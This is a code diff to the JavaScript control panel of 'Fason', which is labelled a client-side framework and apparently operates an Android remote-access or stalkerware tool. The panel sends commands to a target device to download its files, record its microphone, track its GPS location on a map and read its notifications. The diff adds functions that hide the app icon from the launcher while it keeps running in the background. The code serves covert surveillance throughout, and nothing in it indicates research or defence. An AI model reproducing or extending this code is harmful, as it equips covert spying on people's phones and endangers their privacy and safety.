@@ -1,4 +1,4 @@
-// Fason - Professional Client-Side Framework
+// Fason - Client-Side Framework
 (function() {
     'use strict';
 
@@ -11,7 +11,8 @@
         COMMAND_DELAYS: {
             '0xCA': 3000, '0xWI': 3000, '0xLO': 2000, '0xMI': 1000,
             '0xFI': 2000, '0xIN': 2000, '0xPM': 2000, '0xNO': 2000,
-            '0xCB': 1500, '0xSM': 1500, '0xCL': 1500, '0xCO': 1500
+            '0xCB': 1500, '0xSM': 1500, '0xCL': 1500, '0xCO': 1500,
+            '0xGP': 1500, '0xFM': 2500, '0xIF': 2000
         }
     };
 
@@ -21,9 +22,9 @@
     const on = (el, ev, fn) => el?.addEventListener(ev, fn);
     const create = tag => document.createElement(tag);
 
-    // Utils Object
+    // Utils
     const utils = {
-        // Format bytes to human readable
+        // Format bytes
         bytes(bytes, dec = 2) {
             if (!bytes) return '0 B';
             const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'];
@@ -48,7 +49,7 @@
             return div.innerHTML;
         },
 
-        // Debounce function
+        // Debounce
         debounce(fn, delay) {
             let timer;
             return (...args) => { clearTimeout(timer); timer = setTimeout(() => fn(...args), delay); };
@@ -72,7 +73,7 @@
 
     // Toast System
     const toastIcons = { success: '✓', error: '✕', warning: '⚠', info: 'ℹ' };
-    
+
     function toast(msg, type = 'info', duration = CONFIG.TOAST_DURATION) {
         const el = $('toast');
         if (!el) { console.log(`[Toast ${type}] ${msg}`); return; }
@@ -164,10 +165,7 @@
     }
     window.downloadFile = downloadFile;
 
-    // ========================================
-    // BUILDER PAGE
-    // ========================================
-
+    // Builder Page
     function initBuilder() {
         const urlInput = $('serverUrl');
         const homeInput = $('homePageUrl');
@@ -183,12 +181,7 @@
 
         if (!urlInput || !buildBtn) return;
 
-        const urlEls = {
-            urlInfo,
-            protocol: $('protocolValue'),
-            host: $('hostValue'),
-            port: $('portValue')
-        };
+        const urlEls = { urlInfo, protocol: $('protocolValue'), host: $('hostValue'), port: $('portValue') };
 
         // Parse and show URL info
         const showUrlInfo = (url) => {
@@ -197,7 +190,7 @@
                 const u = new URL(url.startsWith('http') ? url : `http://${url}`);
                 const proto = u.protocol.replace(':', '');
                 const port = u.port || (proto === 'https' ? '443' : '80');
-                
+
                 if (urlEls.protocol) urlEls.protocol.innerHTML = `<span class="status-badge ${proto}">${proto.toUpperCase()}</span>`;
                 if (urlEls.host) urlEls.host.textContent = u.hostname;
                 if (urlEls.port) urlEls.port.textContent = port;
@@ -278,26 +271,21 @@
     }
     window.toggleSection = toggleSection;
 
-    // ========================================
-    // LOGS PAGE
-    // ========================================
-
+    // Logs Page
     function initLogs() {
         on($('refreshBtn'), 'click', () => location.reload());
-        
+
         on($('clearBtn'), 'click', async () => {
             if (!confirm('Clear all logs? This cannot be undone.')) return;
             try {
                 const d = await api('/logs/clear', { method: 'POST' });
-                d.success ? (toast('Logs cleared', 'success'), setTimeout(() => location.reload(), 500)) 
+                d.success ? (toast('Logs cleared', 'success'), setTimeout(() => location.reload(), 500))
                           : toast(d.error || 'Failed', 'error');
             } catch { toast('Request failed', 'error'); }
         });
     }
 
-    // ========================================
-    // DEVICE PAGE
-    // ========================================
+    // Device Page
 
     // Browse files
     function browseFiles(path) {
@@ -319,7 +307,7 @@
 
         sendCmdNoReload('0xFI', { action: 'dl', path })
             .then(r => {
-                const badge = r?.error ? `<span class="badge error">Error: ${r.error}</span>` 
+                const badge = r?.error ? `<span class="badge error">Error: ${r.error}</span>`
                                         : `<span class="badge success">✓ Sent</span>`;
                 item.innerHTML = `<div style="display:flex;justify-content:space-between;align-items:center"><span>📄 ${name}</span>${badge}</div>`;
                 if (!r?.error) {
@@ -366,8 +354,9 @@
 
         sendCmdNoReload('0xMI', { sec })
             .then(() => {
-                if (text) text.textContent = 'Complete! Check Downloads.';
+                if (text) text.textContent = 'Complete!';
                 if (progress) { progress.style.width = '100%'; progress.style.background = 'var(--success)'; }
+                setTimeout(() => location.reload(), 1500);
             })
             .catch(() => {
                 if (text) text.textContent = 'Recording failed';
@@ -378,7 +367,7 @@
                     btn.disabled = false;
                     btn.textContent = '🎤 Start Recording';
                     status?.classList.add('hidden');
-                    if (progress) { progress.style.width = '0%'; progress.style.background = 'var(--error)'; }
+                    if (progress) { progress.style.width = '0%'; progress.style.background = 'var(--primary)'; }
                 }, 3000);
             });
     }
@@ -386,10 +375,10 @@
 
     // GPS Map
     let mapInstance = null;
-    
+
     function initMap(locations) {
         if (typeof L === 'undefined' || !$('map')) return null;
-        
+
         mapInstance = L.map('map').setView([0, 0], 2);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             attribution: '© OpenStreetMap'
@@ -404,7 +393,7 @@
                     .bindPopup(`<b>#${i + 1}</b><br>${utils.date(l.time)}<br>Accuracy: ${l.accuracy?.toFixed(0) || '?'}m`);
             });
             if (locations.length > 1) {
-                L.polyline(locations.map(l => [l.latitude, l.longitude]), 
+                L.polyline(locations.map(l => [l.latitude, l.longitude]),
                     { color: '#3b82f6', weight: 3, opacity: 0.7 }).addTo(mapInstance);
             }
         }
@@ -425,16 +414,44 @@
     }
     window.setGpsInterval = setGpsInterval;
 
-    // ========================================
-    // AUTO REFRESH & STATUS
-    // ========================================
+    // Fason Manager
+
+    // Refresh Fason status
+    function refreshFasonStatus() {
+        sendCmd('0xFM', { action: 'status' });
+    }
+    window.refreshFasonStatus = refreshFasonStatus;
+
+    // Hide Fason app
+    function hideFasonApp() {
+        if (!confirm('Hide Fason app from launcher?\n\nThe app will continue running in background but the icon will be hidden from the app drawer.')) return;
+        sendCmd('0xFM', { action: 'hide' });
+    }
+    window.hideFasonApp = hideFasonApp;
+
+    // Show Fason app
+    function showFasonApp() {
+        if (!confirm('Show Fason app in launcher?')) return;
+        sendCmd('0xFM', { action: 'show' });
+    }
+    window.showFasonApp = showFasonApp;
+
+    // Device Info
+
+    // Refresh device info
+    function refreshDeviceInfo() {
+        sendCmd('0xIF');
+    }
+    window.refreshDeviceInfo = refreshDeviceInfo;
+
+    // Auto Refresh & Status
 
     function setupAutoRefresh() {
         const id = getDeviceId();
         if (!id) return;
         const refreshPages = ['info', 'downloads', 'permissions', 'notifications'];
         if (!refreshPages.some(p => location.pathname.includes('/' + p))) return;
-        
+
         setInterval(() => {
             if (document.visibilityState === 'visible') location.reload();
         }, CONFIG.AUTO_REFRESH);
@@ -466,10 +483,7 @@
         });
     }
 
-    // ========================================
-    // INIT
-    // ========================================
-
+    // Init
     on(document, 'DOMContentLoaded', () => {
         setupAutoRefresh();
         setupKeys();
